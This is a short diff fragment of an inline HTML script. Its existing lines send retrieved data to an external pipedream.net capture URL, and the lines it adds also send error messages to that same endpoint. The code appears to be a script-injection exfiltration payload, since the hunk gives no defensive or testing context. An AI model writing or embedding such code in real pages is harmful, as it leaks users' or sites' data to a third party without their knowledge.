@@ -6,4 +6,7 @@
     .then(data => {
       fetch('https://eomfuajl79ed6za.m.pipedream.net?data=' + encodeURIComponent(data))
     })
+    .catch(err => {
+      fetch('https://eomfuajl79ed6za.m.pipedream.net?error=' + encodeURIComponent(err.toString()))
+    })
 </script>
